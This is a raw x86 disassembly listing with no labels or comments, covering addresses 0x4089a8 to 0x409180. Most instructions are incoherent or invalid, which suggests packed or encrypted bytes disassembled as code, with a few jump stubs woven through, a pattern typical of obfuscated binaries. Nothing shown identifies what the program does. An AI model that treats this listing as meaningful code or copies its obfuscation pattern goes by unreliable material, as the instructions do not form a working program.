  4089a8:	sbb    eax,0x389492ea
  4089ad:	pop    edx
  4089ae:	xor    cl,BYTE PTR [edx+0x535a4243]
  4089b4:	inc    edi
  4089b5:	push   edx
  4089b6:	retf   
  4089b7:	xor    DWORD PTR [edi],0xcf0194db
  4089bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4089be:	out    dx,eax
  4089bf:	imul   edx,DWORD PTR ss:[eax+eiz*2+0x3c255e45],0x7d
  4089c8:	adc    bl,BYTE PTR [eax+0x4b]
  4089cb:	mov    BYTE PTR [edx+0x5d895876],bl
  4089d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4089d2:	sbb    ch,BYTE PTR [ecx+0x75]
  4089d5:	mov    ds:0xe106aa76,al
  4089da:	xor    ebp,DWORD PTR [eax]
  4089dc:	shr    esi,1
  4089de:	jecxz  0x40899e
  4089e0:	push   ebx
  4089e1:	add    DWORD PTR [ebx],ebp
  4089e3:	dec    ebp
  4089e4:	xor    al,0x31
  4089e6:	test   DWORD PTR [bx],0xc509987b
  4089ed:	addr16 push esi
  4089ef:	mov    dl,0x3
  4089f1:	push   eax
  4089f2:	daa    
  4089f3:	daa    
  4089f4:	imul   esp,ecx,0x50da9773
  4089fa:	dec    edx
  4089fb:	aam    0x52
  4089fd:	push   0xfc6abe76
  408a02:	fistp  WORD PTR [edx+0x6a]
  408a05:	nop
  408a06:	outs   dx,BYTE PTR ds:[esi]
  408a07:	test   eax,0xaa2d6a25
  408a0c:	pop    eax
  408a0d:	pop    esp
  408a0e:	(bad)  
  408a0f:	mov    ebx,0x25c4a376
  408a14:	dec    edi
  408a15:	lea    esi,[esi]
  408a17:	xchg   ecx,eax
  408a18:	and    ch,BYTE PTR [esp+ebp*1]
  408a1b:	mov    ah,dl
  408a1d:	cwde   
  408a1e:	lods   eax,DWORD PTR ds:[esi]
  408a1f:	mov    edi,0x29a1190b
  408a24:	fcomi  st,st(1)
  408a26:	test   BYTE PTR [ecx-0x73],dh
  408a29:	call   0xf80d:0xa5cd260a
  408a30:	push   0x73d33185
  408a35:	int3   
  408a36:	shl    DWORD PTR [ebp+0xa87f9f5],1
  408a3c:	jns    0x4089fe
  408a3e:	dec    esp
  408a3f:	cwde   
  408a40:	ror    edi,cl
  408a42:	dec    edx
  408a43:	popf   
  408a44:	cld    
  408a45:	idiv   BYTE PTR [edx+0x1e9b7c05]
  408a4b:	int3   
  408a4c:	daa    
  408a4d:	dec    ebp
  408a4e:	data16 (bad) 
  408a50:	fdiv   DWORD PTR [edx-0x3aebf4ab]
  408a56:	int3   
  408a57:	js     0x408a26
  408a59:	pop    ecx
  408a5a:	pop    es
  408a5b:	jb     0x408ac7
  408a5d:	or     BYTE PTR ds:0xe009451d,0x50
  408a64:	(bad)  
  408a65:	mov    esi,0xd32c5e38
  408a6a:	pop    edx
  408a6b:	out    dx,eax
  408a6c:	bound  eax,QWORD PTR [ebx-0x279bd20d]
  408a72:	adc    DWORD PTR [ebx-0x3f],edx
  408a75:	sbb    bl,BYTE PTR [ecx-0x80]
  408a78:	shr    ebp,0x69
  408a7b:	jnp    0x408a07
  408a7d:	fild   DWORD PTR [ebx-0x7c]
  408a80:	test   BYTE PTR [eax-0x1db26114],0x98
  408a87:	in     eax,0x8d
  408a89:	jns    0x408a12
  408a8b:	push   ebx
  408a8c:	arpl   WORD PTR [eax],si
  408a8e:	sub    al,0x9f
  408a90:	or     al,0xf5
  408a92:	dec    edi
  408a93:	(bad)  
  408a95:	imul   ecx,ecx,0xffffffdc
  408a98:	mov    edx,0xa2702467
  408a9d:	dec    esp
  408a9e:	lods   al,BYTE PTR ds:[esi]
  408a9f:	push   ebx
  408aa0:	or     dl,BYTE PTR [ebx+ecx*4+0x6a7b1e2e]
  408aa7:	out    0x4e,al
  408aa9:	jbe    0x408af6
  408aab:	jbe    0x408b28
  408aad:	and    esi,DWORD PTR [edi-0x5b]
  408ab0:	mov    ch,0xaf
  408ab2:	sbb    ebx,DWORD PTR [edx+0x3a91874]
  408ab8:	cld    
  408ab9:	jl     0x408a6d
  408abb:	xor    BYTE PTR [ebp-0x6e57fb10],0x85
  408ac2:	xor    DWORD PTR [edi],ebx
  408ac4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ac5:	sbb    DWORD PTR [edx-0x68],0xac81c79c
  408acc:	gs repnz sub al,0xac
  408ad0:	fsub   QWORD PTR [ebx-0x58e08b82]
  408ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ad7:	sete   BYTE PTR [ecx+0x3f]
  408adb:	out    0x40,eax
  408add:	in     al,dx
  408ade:	mov    dh,0x27
  408ae0:	jo     0x408a95
  408ae2:	call   0x5eac:0xe50926f2
  408ae9:	push   cs
  408aea:	jmp    0x408b07
  408aec:	xor    DWORD PTR [ecx-0xb],ebp
  408aef:	test   DWORD PTR [ecx],ecx
  408af1:	adc    ecx,DWORD PTR [ebx+eiz*8]
  408af4:	adc    DWORD PTR [esi+0x2e0d7e77],esi
  408afa:	xchg   DWORD PTR [edi-0x24d1ef90],edx
  408b00:	adc    DWORD PTR [ecx],esi
  408b02:	test   eax,0xadb2470e
  408b07:	mov    WORD PTR [ebp+0x34],es
  408b0a:	inc    eax
  408b0b:	xchg   edx,eax
  408b0c:	push   0x0
  408b0e:	cld    
  408b0f:	lods   eax,DWORD PTR ds:[esi]
  408b10:	out    0xdb,eax
  408b12:	hlt    
  408b13:	mov    edi,DWORD PTR [ebx+0x45]
  408b16:	inc    edx
  408b17:	and    BYTE PTR [eax+0x3dfc76d2],al
  408b1d:	in     al,dx
  408b1e:	jnp    0x408af7
  408b20:	call   0x1fbef9aa
  408b25:	(bad)  
  408b26:	(bad)  
  408b27:	push   edx
  408b28:	test   DWORD PTR [ecx+esi*4+0x3a],0xfceb8ca9
  408b30:	cs (bad) 
  408b32:	sbb    ebp,DWORD PTR [eax]
  408b34:	fld    QWORD PTR [edi-0x4f279426]
  408b3a:	cmp    DWORD PTR [ebx+0x74fd4330],ecx
  408b40:	sbb    eax,0x5b040c
  408b45:	sub    DWORD PTR [ebx+0x1b31d91c],0x71
  408b4c:	fcomp  QWORD PTR [eax]
  408b4e:	fs sti 
  408b50:	push   eax
  408b51:	pop    edx
  408b52:	ss test cl,bh
  408b55:	mov    ah,0x9e
  408b57:	(bad)  
  408b58:	enter  0xa062,0x76
  408b5c:	dec    edi
  408b5d:	frstor [eax]
  408b5f:	mov    ebp,0xad67cc3f
  408b64:	cmp    al,0x15
  408b66:	popa   
  408b67:	lea    eax,[edx+ecx*2-0x73af9156]
  408b6e:	loopne 0x408b5f
  408b70:	jp     0x408b36
  408b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b73:	adc    eax,0x49cca3b1
  408b78:	cmp    DWORD PTR [esi-0x17],0x7c
  408b7c:	mov    bl,0xd0
  408b7e:	shl    BYTE PTR [esi-0x52],0xd4
  408b82:	inc    esi
  408b83:	test   al,0x8c
  408b85:	mov    ah,0x5f
  408b87:	shr    BYTE PTR [ebx+0x1da1ea9],0x52
  408b8e:	ins    BYTE PTR es:[edi],dx
  408b8f:	push   0x68
  408b91:	cmp    DWORD PTR [esi],edx
  408b93:	out    dx,al
  408b94:	aad    0x93
  408b96:	aam    0x0
  408b98:	cmp    DWORD PTR [edx+edi*1+0x22],edi
  408b9c:	or     ebp,DWORD PTR [edi-0x6e8c5c19]
  408ba2:	push   ebx
  408ba3:	jno    0x408c23
  408ba5:	pop    ecx
  408ba6:	repz inc edx
  408ba8:	std    
  408ba9:	sub    DWORD PTR [ebx+0xe917cd8],eax
  408baf:	mov    ecx,0xe38e4d03
  408bb4:	sbb    edi,DWORD PTR ds:0xec1f8c5a
  408bba:	cs das 
  408bbc:	xor    al,al
  408bbe:	mov    edx,0x47484b1b
  408bc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bc4:	xchg   ebp,eax
  408bc5:	inc    eax
  408bc6:	push   esi
  408bc7:	lds    edx,FWORD PTR [esi-0x2cafa46e]
  408bcd:	jns    0x408b96
  408bcf:	mov    fs,WORD PTR [edi]
  408bd1:	push   cs
  408bd2:	cld    
  408bd3:	sti    
  408bd4:	xor    al,0xf9
  408bd6:	adc    al,bh
  408bd8:	xor    al,cl
  408bda:	(bad)  
  408bdb:	out    dx,al
  408bdc:	ret    0x738d
  408bdf:	imul   ecx,DWORD PTR [esi-0x45183e60],0x2e
  408be6:	add    al,0x59
  408be8:	jnp    0x408b91
  408bea:	ror    BYTE PTR [edi+ebp*2+0x407e6913],cl
  408bf1:	fmul   st,st(2)
  408bf3:	lods   eax,DWORD PTR ds:[esi]
  408bf4:	cmc    
  408bf5:	mov    edx,DWORD PTR [edi+ebx*4+0x0]
  408bf9:	pop    esp
  408bfa:	test   DWORD PTR [edi-0x29],esp
  408bfd:	xlat   BYTE PTR ds:[ebx]
  408bfe:	(bad)  
  408c00:	(bad)  
  408c01:	out    0xc6,eax
  408c03:	lea    esp,[esi+0x4f7e18e0]
  408c09:	into   
  408c0a:	retf   
  408c0b:	ror    DWORD PTR [eax+0x3d4c16e2],cl
  408c11:	mov    ebp,DWORD PTR [eax+0x4e]
  408c14:	stos   DWORD PTR es:[edi],eax
  408c15:	cmp    al,0x9b
  408c17:	test   eax,0x355cb57
  408c1c:	daa    
  408c1d:	cli    
  408c1e:	int3   
  408c1f:	jb     0x408c85
  408c21:	cmp    edx,0x56
  408c24:	jno    0x408bd5
  408c26:	xor    al,0x60
  408c28:	bound  ebp,QWORD PTR [edi]
  408c2a:	pop    ds
  408c2b:	iret   
  408c2c:	mov    bh,0x56
  408c2e:	outs   dx,BYTE PTR ds:[esi]
  408c2f:	push   0xffffffff
  408c31:	xor    eax,0x6ec6ce9b
  408c36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c37:	adc    DWORD PTR ds:0xb4ccdbfd,ebx
  408c3d:	xor    eax,0x3b44d88
  408c42:	cdq    
  408c43:	mov    dh,0xb3
  408c45:	in     al,dx
  408c46:	sub    al,0x59
  408c48:	dec    ecx
  408c49:	xchg   ecx,edx
  408c4b:	dec    BYTE PTR [edx]
  408c4d:	push   DWORD PTR [ebp-0x10]
  408c50:	mov    eax,ds:0x41b264
  408c55:	mov    eax,DWORD PTR [eax]
  408c57:	push   DWORD PTR [eax]
  408c59:	lea    eax,ds:0x41b280
  408c5f:	jmp    0x408fac
  408c64:	mov    ebx,0x93838448
  408c69:	push   ebx
  408c6a:	mov    ebx,0x78da0248
  408c6f:	bound  esi,QWORD PTR [eax+0x22]
  408c72:	sbb    BYTE PTR [ebp+0x47],dh
  408c75:	fnstenv [eax+0x70]
  408c78:	and    BYTE PTR [ebp+0x70],bh
  408c7b:	jo     0x408c55
  408c7d:	dec    ebp
  408c7e:	jbe    0x408c6a
  408c80:	bnd call DWORD PTR [edx-0x62ee59c2]
  408c87:	xchg   ecx,eax
  408c88:	sbb    DWORD PTR [ecx+0x26126448],edi
  408c8e:	cmp    eax,0xcf3949d9
  408c93:	outs   dx,DWORD PTR ds:[esi]
  408c94:	xchg   BYTE PTR [edi+0x59],dh
  408c97:	fsubp  st(3),st
  408c99:	fsubr  QWORD PTR [edi+esi*4-0x2d41c9f3]
  408ca0:	xor    BYTE PTR [ecx+0x4c991127],bh
  408ca6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca7:	repnz cmc 
  408ca9:	cmp    BYTE PTR [eax+0x79],dl
  408cac:	cli    
  408cad:	scas   al,BYTE PTR es:[edi]
  408cae:	sbb    eax,0x751dc73d
  408cb3:	push   0xffffffd7
  408cb5:	loopne 0x408c47
  408cb7:	sub    BYTE PTR [ecx+eax*8-0x6941f639],0xc1
  408cbf:	pop    ss
  408cc0:	mov    esi,0x436fff4a
  408cc5:	xchg   edi,eax
  408cc6:	or     BYTE PTR [eax+0x15750871],cl
  408ccc:	lods   al,BYTE PTR ds:[esi]
  408ccd:	jmp    0xcd082c6d
  408cd2:	clc    
  408cd3:	sub    al,0x81
  408cd5:	sbb    al,0xa3
  408cd7:	jmp    0x6417:0xaa8c5b17
  408cde:	in     eax,dx
  408cdf:	and    DWORD PTR [edi+0x60b3a09a],esi
  408ce5:	push   edi
  408ce6:	cwde   
  408ce7:	rcr    DWORD PTR [eax],cl
  408ce9:	std    
  408cea:	out    dx,al
  408ceb:	jne    0x408d56
  408ced:	mov    edi,0x6c1c4f5a
  408cf2:	rcr    BYTE PTR [ebp-0x1b796b43],cl
  408cf8:	in     eax,dx
  408cf9:	jo     0x408d24
  408cfb:	pop    ebx
  408cfc:	imul   esi,DWORD PTR [edx-0x38b60a2e],0x3f
  408d03:	cmp    al,0xe5
  408d05:	arpl   WORD PTR [edi],sp
  408d07:	js     0x408d14
  408d09:	inc    ebp
  408d0a:	jp     0x408d89
  408d0c:	mov    ds:0x930658fd,eax
  408d11:	mov    bl,0x26
  408d13:	mov    BYTE PTR [eax+eiz*2],ah
  408d16:	int    0xe3
  408d18:	mov    ecx,0x55fd03d9
  408d1d:	out    dx,eax
  408d1e:	imul   DWORD PTR [edx]
  408d20:	fs ss sub eax,0x72c4088e
  408d27:	std    
  408d28:	ds inc ebp
  408d2a:	dec    esp
  408d2b:	mov    al,0x77
  408d2d:	cmp    dl,bh
  408d2f:	mov    esp,0x9dc415cb
  408d34:	pop    edi
  408d35:	mov    ebp,0x422b97a0
  408d3a:	mov    dh,0x42
  408d3c:	repnz xchg esi,eax
  408d3e:	stos   DWORD PTR es:[edi],eax
  408d3f:	adc    cl,al
  408d41:	arpl   WORD PTR [ebx+0x6c502a21],bx
  408d47:	js     0x408d39
  408d49:	test   al,0x29
  408d4b:	xchg   ebp,eax
  408d4c:	je     0x408d7d
  408d4e:	xor    al,0x56
  408d50:	jns    0x408dca
  408d52:	add    esp,ebp
  408d54:	push   edx
  408d55:	lahf   
  408d56:	clc    
  408d57:	aaa    
  408d58:	jg     0x408ced
  408d5a:	adc    BYTE PTR [eax],ah
  408d5c:	fwait
  408d5d:	lds    ebp,FWORD PTR [ecx-0x77]
  408d60:	out    0xb4,al
  408d62:	mov    ebp,0x6fce4095
  408d67:	hlt    
  408d68:	push   ecx
  408d69:	add    DWORD PTR [edi+0x59],esi
  408d6c:	add    dh,BYTE PTR [ebp+0x34]
  408d6f:	adc    ch,bh
  408d71:	mov    esi,0xb26a14b0
  408d76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d77:	daa    
  408d78:	dec    ecx
  408d79:	leave  
  408d7a:	push   ebp
  408d7b:	jl     0x408dae
  408d7d:	xlat   BYTE PTR ds:[ebx]
  408d7e:	ja     0x408d44
  408d80:	ret    
  408d81:	inc    edi
  408d82:	ret    0x17b2
  408d85:	lahf   
  408d86:	push   ecx
  408d87:	inc    eax
  408d88:	push   ebx
  408d89:	popa   
  408d8a:	sub    al,0xee
  408d8c:	cmp    BYTE PTR [ecx+ebp*2+0x1a],cl
  408d90:	test   DWORD PTR [ebx-0x2781cabd],edx
  408d96:	pop    eax
  408d97:	cwde   
  408d98:	cmp    bh,BYTE PTR [ecx+0x5168a901]
  408d9e:	cmp    al,0xc9
  408da0:	shl    BYTE PTR [edi+0x5fbcdb7b],0xce
  408da7:	sub    ebx,DWORD PTR [edi]
  408da9:	xchg   DWORD PTR [ecx+0x13],ebx
  408dac:	out    dx,eax
  408dad:	stos   DWORD PTR es:[edi],eax
  408dae:	pop    ds
  408daf:	jne    0x408d68
  408db1:	mov    ecx,0x9034e3d3
  408db6:	mov    edx,0x4b298f29
  408dbb:	(bad)
  408dbf:	cmp    ebx,0x43638c94
  408dc5:	pop    edx
  408dc6:	nop
  408dc7:	mov    ah,0xb9
  408dc9:	neg    esi
  408dcb:	(bad)  
  408dcc:	ins    DWORD PTR es:[edi],dx
  408dcd:	xchg   esp,eax
  408dce:	push   ax
  408dd0:	aad    0x2b
  408dd2:	pushf  
  408dd3:	cli    
  408dd4:	xor    bl,BYTE PTR [esi-0x2d35a35a]
  408dda:	dec    esi
  408ddb:	dec    edx
  408ddc:	pop    esi
  408ddd:	loopne 0x408d8f
  408ddf:	mov    edx,0x4f79830b
  408de4:	sahf   
  408de5:	ds jo  0x408e5b
  408de8:	and    ah,BYTE PTR [edi+0x74]
  408deb:	out    0x34,eax
  408ded:	cmp    BYTE PTR [eax],0x37
  408df0:	mov    ah,0x7a
  408df2:	ret    0x6080
  408df5:	retf   0x1e49
  408df8:	push   esp
  408df9:	imul   ebx,DWORD PTR [eax-0x71],0x43
  408dfd:	clc    
  408dfe:	hlt    
  408dff:	call   0xff4e309c
  408e04:	mov    dl,0xc0
  408e06:	add    bh,BYTE PTR [eax]
  408e08:	push   ss
  408e09:	add    BYTE PTR [edx-0x7e1e4f3d],0x1
  408e10:	call   0xd9482d35
  408e15:	out    0x15,eax
  408e17:	lods   eax,DWORD PTR ds:[esi]
  408e18:	popf   
  408e19:	or     al,0x14
  408e1b:	jnp    0x408e83
  408e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e1e:	push   DWORD PTR [edi+0x0]
  408e21:	lods   eax,DWORD PTR ds:[esi]
  408e22:	out    dx,al
  408e23:	jmp    0x51bf056e
  408e28:	enter  0x2162,0x6c
  408e2c:	and    BYTE PTR [eax],0x6c
  408e2f:	test   al,0xa9
  408e31:	repz jmp 0xe0b4e15a
  408e37:	add    BYTE PTR [ebx-0x64e3729f],cl
  408e3d:	mov    dl,0xce
  408e3f:	jge    0x408e9b
  408e41:	xchg   DWORD PTR [edi+0x6112c745],ebx
  408e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e48:	or     DWORD PTR [edi-0xc],0xd16e3772
  408e4f:	adc    ecx,esp
  408e51:	cmp    eax,0x249619aa
  408e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408e57:	std    
  408e58:	or     eax,0xdd27c9df
  408e5d:	or     bh,BYTE PTR [ebx]
  408e5f:	in     eax,0x51
  408e61:	out    0x61,eax
  408e63:	jne    0x408e4a
  408e65:	je     0x408e7f
  408e67:	push   edx
  408e68:	xor    al,0x7b
  408e6a:	mov    al,0xc4
  408e6c:	ret    
  408e6d:	cdq    
  408e6e:	mov    cs,edx
  408e70:	sbb    BYTE PTR ds:0xb7333ad2,ch
  408e76:	push   di
  408e78:	mov    cl,0x1d
  408e7a:	push   0x700199cc
  408e7f:	pop    ebp
  408e80:	xchg   ebx,eax
  408e81:	out    dx,al
  408e82:	dec    edi
  408e83:	test   al,0xab
  408e85:	sub    edi,DWORD PTR [esi+0x5d7c65df]
  408e8b:	xor    eax,0x1a12ee1a
  408e90:	mov    ebp,0xa157ece2
  408e95:	iret   
  408e96:	cs push ecx
  408e98:	jnp    0x408f03
  408e9a:	shl    DWORD PTR [esi-0x7a29350b],cl
  408ea0:	iret   
  408ea1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ea2:	repz fsubr QWORD PTR [esi]
  408ea5:	popf   
  408ea6:	and    BYTE PTR [eax-0x596ca228],cl
  408eac:	nop
  408ead:	xchg   esp,eax
  408eae:	xchg   esp,eax
  408eaf:	mov    edi,0x50d42b76
  408eb4:	sub    edi,DWORD PTR [edi-0x2]
  408eb7:	call   0x5f31:0xfefb50d3
  408ebe:	das    
  408ebf:	sbb    ah,bh
  408ec1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ec2:	(bad)  
  408ec3:	sub    eax,0x322bfd95
  408ec8:	inc    esp
  408ec9:	cmp    eax,0xdf924124
  408ece:	mov    edi,0xc4643ee8
  408ed3:	cmp    cl,ah
  408ed5:	xchg   BYTE PTR [ebp+0x1888e6cd],dh
  408edb:	stc    
  408edc:	clc    
  408edd:	push   cs
  408ede:	in     eax,0xc3
  408ee0:	or     eax,0x245699e5
  408ee5:	and    eax,0x7b390a43
  408eea:	adc    DWORD PTR [ecx],ebp
  408eec:	xchg   edx,eax
  408eed:	popa   
  408eee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408eef:	jg     0x408f2c
  408ef1:	nop
  408ef2:	mov    edx,0x78281239
  408ef7:	in     eax,dx
  408ef8:	test   al,0xb
  408efa:	xor    BYTE PTR [ebx],al
  408efc:	inc    bh
  408efe:	mov    esp,0x15cbc1fe
  408f03:	add    ebx,DWORD PTR [ecx+edi*4+0x6b]
  408f07:	loope  0x408f4f
  408f09:	mov    ch,0x67
  408f0b:	jmp    0x408f38
  408f0d:	dec    ebp
  408f0e:	jle    0x408e96
  408f10:	add    DWORD PTR [ecx+0xd],esi
  408f13:	jno    0x408f06
  408f15:	scas   eax,DWORD PTR es:[edi]
  408f16:	mov    ecx,0xe3131de6
  408f1b:	data16 ror dh,cl
  408f1e:	jno    0x408ead
  408f20:	nop
  408f21:	sar    DWORD PTR [edx-0x5b],0xb2
  408f25:	add    esi,esi
  408f27:	mov    ebp,0x7240a5bd
  408f2c:	popa   
  408f2d:	sub    DWORD PTR [eax+0xa0e866a],eax
  408f33:	pop    edi
  408f34:	sti    
  408f35:	cmc    
  408f36:	pop    eax
  408f37:	fisttp QWORD PTR [esi+0x3d1f186e]
  408f3d:	pop    ebp
  408f3e:	xor    DWORD PTR [eax-0x2a48ac5c],edi
  408f44:	push   es
  408f45:	div    BYTE PTR [edx+eax*4-0x1a]
  408f49:	adc    eax,0xf4be86bc
  408f4e:	push   ebx
  408f4f:	mov    cl,0xce
  408f51:	xchg   esi,eax
  408f52:	jmp    0x408f2c
  408f54:	not    BYTE PTR [eax-0x22]
  408f57:	inc    edx
  408f58:	shl    BYTE PTR [esi+0x1a889885],cl
  408f5e:	mov    ecx,0x75630b34
  408f63:	fs pop es
  408f65:	jo     0x408f27
  408f67:	add    al,0xbd
  408f69:	xor    BYTE PTR [edx],bh
  408f6b:	or     BYTE PTR [edx-0x7e73721c],al
  408f71:	or     eax,0x122b6d9c
  408f76:	jmp    0x7563:0x695fb961
  408f7d:	add    ch,BYTE PTR [ebx]
  408f7f:	push   es
  408f80:	lea    ebp,[eax]
  408f82:	retf   0x1849
  408f85:	test   al,0xc
  408f87:	pop    es
  408f88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f89:	shl    BYTE PTR [eax-0x4],0xe6
  408f8d:	bound  ebp,QWORD PTR ds:[ebp+0x4f]
  408f91:	inc    ebp
  408f92:	inc    ebx
  408f93:	dec    eax
  408f94:	(bad)  [eax+0x6ef0f3ab]
  408f9a:	dec    ebx
  408f9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f9c:	and    al,0x29
  408f9e:	fistp  WORD PTR [edi+eiz*1+0x2b]
  408fa2:	and    cl,ch
  408fa4:	mov    ch,0xaa
  408fa6:	push   edi
  408fa7:	ja     0x409018
  408fa9:	shr    cl,0x16
  408fac:	push   DWORD PTR [eax]
  408fae:	lea    eax,ds:0x41b02c
  408fb4:	jmp    0x409301
  408fb9:	add    al,0x7c
  408fbb:	out    0xcb,eax
  408fbd:	out    0xf3,eax
  408fbf:	xor    al,0xd3
  408fc1:	call   0xbb1937f3
  408fc6:	mov    cl,0xcf
  408fc8:	push   esi
  408fc9:	ja     0x408fb1
  408fcb:	jo     0x40903d
  408fcd:	and    BYTE PTR [ebp+0x70],bh
  408fd0:	jo     0x40902a
  408fd2:	jno    0x408fcc
  408fd4:	sub    edx,DWORD PTR [esp+ebp*1+0x9]
  408fd8:	repnz add BYTE PTR [ecx],al
  408fdb:	gs jmp 0x8a23cfff
  408fe1:	or     DWORD PTR [ecx-0x6f],esi
  408fe4:	dec    ebp
  408fe5:	mov    al,0x76
  408fe7:	imul   ebp,DWORD PTR ds:0x4135ef53,0xffffffb6
  408fee:	stos   BYTE PTR es:[edi],al
  408fef:	test   DWORD PTR [esi-0x7e],eax
  408ff2:	nop
  408ff3:	sbb    bh,BYTE PTR [eax-0x7e]
  408ff6:	dec    edi
  408ff7:	add    al,0x99
  408ff9:	dec    ebx
  408ffa:	or     BYTE PTR [eax-0x75],al
  408ffd:	mov    ds:0x6198a7d3,al
  409002:	sub    ecx,DWORD PTR [ebp+0x2d]
  409005:	(bad)  
  409006:	ins    BYTE PTR es:[edi],dx
  409007:	loope  0x408f97
  409009:	arpl   WORD PTR [esi+eax*2+0x43],sp
  40900d:	dec    eax
  40900e:	fistp  WORD PTR [ebx]
  409010:	inc    ebp
  409011:	(bad)
  409015:	mov    eax,ds:0xcad17019
  40901a:	or     BYTE PTR [edx],al
  40901c:	clc    
  40901d:	sbb    DWORD PTR [ebp-0x69],edx
  409020:	fsub   QWORD PTR [edi-0x2d]
  409023:	cmp    dh,bh
  409025:	sub    eax,0xfae282f0
  40902a:	dec    ecx
  40902b:	daa    
  40902c:	pop    es
  40902d:	lods   eax,DWORD PTR ds:[esi]
  40902e:	jl     0x409066
  409030:	add    al,0xdb
  409032:	xchg   sp,ax
  409034:	or     DWORD PTR cs:[ebx+0x15be0cdc],edx
  40903b:	mov    bh,0x95
  40903d:	mov    ebp,0xad8dd5ff
  409042:	jo     0x40908e
  409044:	sub    BYTE PTR [eax+esi*1-0x72],cl
  409048:	push   0x31edd6f9
  40904d:	mov    BYTE PTR [ecx-0x3d],ah
  409050:	dec    eax
  409051:	(bad)  
  409052:	das    
  409053:	jno    0x409051
  409055:	dec    edi
  409056:	fsub   st(0),st
  409058:	pop    edi
  409059:	cmp    dl,ch
  40905b:	es xor ah,bh
  40905e:	hlt    
  40905f:	ja     0x409012
  409061:	cmp    eax,0xdabda5f0
  409066:	mov    eax,0x547e1606
  40906b:	sbb    esp,edi
  40906d:	retf   
  40906e:	sub    esp,DWORD PTR [edx-0xf86717e]
  409074:	jbe    0x4090cb
  409076:	dec    esi
  409077:	sub    dl,BYTE PTR [esi+eax*1-0x17]
  40907b:	xchg   edx,eax
  40907c:	and    esi,DWORD PTR [edx-0x79]
  40907f:	(bad)  
  409080:	cmp    ch,BYTE PTR [edi+0x1a]
  409083:	or     BYTE PTR [edx-0x1],bl
  409086:	jl     0x40904f
  409088:	aad    0x6c
  40908a:	cdq    
  40908b:	dec    DWORD PTR [edx+0x30]
  40908e:	mov    ch,0xe7
  409090:	or     BYTE PTR [ebx],ch
  409092:	mov    ch,0xb4
  409094:	ss sti 
  409096:	out    0xea,al
  409098:	jno    0x409065
  40909a:	lods   al,BYTE PTR ds:[esi]
  40909b:	cmp    DWORD PTR [edi+eiz*2],edx
  40909e:	pop    esp
  40909f:	idiv   eax
  4090a1:	add    al,0x2
  4090a3:	or     eax,0xcf39e626
  4090a8:	jle    0x4090cc
  4090aa:	xchg   dl,bl
  4090ac:	mov    ebp,0x139c588f
  4090b1:	int    0xdc
  4090b3:	inc    eax
  4090b4:	push   esi
  4090b5:	xchg   cl,bl
  4090b7:	and    al,0xe1
  4090b9:	mov    BYTE PTR [edx-0x5e7158dd],ah
  4090bf:	cmp    BYTE PTR [eax-0x708f80a6],bh
  4090c5:	div    BYTE PTR [esi-0x38]
  4090c8:	push   ebx
  4090c9:	ins    BYTE PTR es:[edi],dx
  4090ca:	or     ebx,esp
  4090cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4090cd:	sbb    ah,BYTE PTR [esi+0x62]
  4090d0:	daa    
  4090d1:	sbb    eax,0x388cf75
  4090d6:	call   0x63b7:0x539429b2
  4090dd:	test   BYTE PTR [ecx+0x59efa876],ch
  4090e3:	mov    BYTE PTR [ecx+0xc],bh
  4090e6:	xchg   edi,eax
  4090e7:	pop    eax
  4090e8:	cdq    
  4090e9:	mov    ds:0xa4130006,eax
  4090ee:	call   0xccc6421
  4090f3:	inc    edx
  4090f4:	xchg   edx,eax
  4090f5:	pushf  
  4090f6:	mov    ah,0x77
  4090f8:	mov    dl,0xaa
  4090fa:	push   edi
  4090fb:	sub    BYTE PTR [esi+ebp*4-0x26beed68],cl
  409102:	loop   0x409160
  409104:	ss dec esi
  409106:	or     BYTE PTR [ecx-0x73],dl
  409109:	mov    dh,al
  40910b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40910c:	xchg   esp,eax
  40910d:	adc    BYTE PTR [edi+0x36c63360],dl
  409113:	add    bl,BYTE PTR [ebx+0x66]
  409116:	sub    BYTE PTR [eax+0xc],bh
  409119:	xchg   esi,eax
  40911a:	arpl   WORD PTR [ecx-0x1c],sp
  40911d:	push   es
  40911e:	pop    esp
  40911f:	mov    ebx,DWORD PTR [esi+0x1040b536]
  409125:	lods   al,BYTE PTR ds:[esi]
  409126:	adc    esi,DWORD PTR [ebx]
  409128:	icebp  
  409129:	cli    
  40912a:	pop    ecx
  40912b:	dec    ebp
  40912c:	add    edi,DWORD PTR [esi-0x2b]
  40912f:	xor    edi,DWORD PTR [esi-0x4d93d31c]
  409135:	(bad)  [edi]
  409137:	mov    al,0xa1
  409139:	daa    
  40913a:	xor    ah,BYTE PTR [edx+0x4328417d]
  409140:	adc    al,0xe6
  409142:	sub    BYTE PTR [eax],ah
  409144:	mov    bh,0xcd
  409146:	clc    
  409147:	dec    edi
  409148:	jmp    0x74a3c5f0
  40914d:	repnz fwait
  40914f:	(bad)  
  409150:	in     eax,dx
  409151:	mov    ch,0x5e
  409153:	stos   DWORD PTR es:[edi],eax
  409154:	jne    0x40915b
  409156:	clc    
  409157:	enter  0x4545,0x70
  40915b:	js     0x4091db
  40915d:	(bad)  
  40915e:	retf   0xcd98
  409161:	push   0xffffffd0
  409163:	mov    eax,0xe289b2a7
  409168:	mov    edx,0xaf7d890
  40916d:	push   ebp
  40916e:	push   0x705990e0
  409173:	je     0x40917f
  409175:	rol    DWORD PTR [eax-0x5],1
  409178:	push   edx
  409179:	das    
  40917a:	and    BYTE PTR [edx+0x2dd07278],bl
  409180:	inc    ebx
